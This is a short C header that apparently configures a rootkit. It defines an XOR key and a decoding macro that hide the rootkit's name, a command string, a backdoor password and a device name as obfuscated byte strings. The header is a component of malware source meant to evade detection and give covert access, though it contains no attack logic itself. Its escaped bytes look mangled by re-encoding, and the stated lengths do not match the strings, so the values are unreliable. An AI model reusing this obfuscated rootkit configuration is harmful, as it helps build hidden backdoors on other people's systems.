#ifndef __RK_DEFS__

// #define DEBUG 1

#define XOR_KEY "\x0b\xa3P\xdb\xa8b\xa7\x81\xe47b6"
#define XOR_KEY_LEN 12

#define SAFE_STR(str, strlen) safe_str(str, strlen, XOR_KEY, XOR_KEY_LEN)

#define RK_NAME SAFE_STR("x\xc3\x8b5\xc2\xbf\xc3\x81\x0f\n", 33)
#define RK_CMD SAFE_STR("$\xc3\x875\xc2\xad\xc2\x87\x11\xc3\x8f\xc3\xac\xc3\x8bE \x18\n", 63)

#define RK_PASSWORD SAFE_STR("{\xc3\x82#\xc2\xa8\xc3\x9fR\xc3\x95\xc3\xa5\xc3\x85\n", 54)
#define RK_PASSWORD_LEN 10

#define RK_DEVICE_NAME SAFE_STR("y\xc3\x8c?\xc2\xaf\xc3\x83\x0b\xc3\x93\n", 41)

#define BUF_SIZE 256

#define __RK_DEFS__
#endif
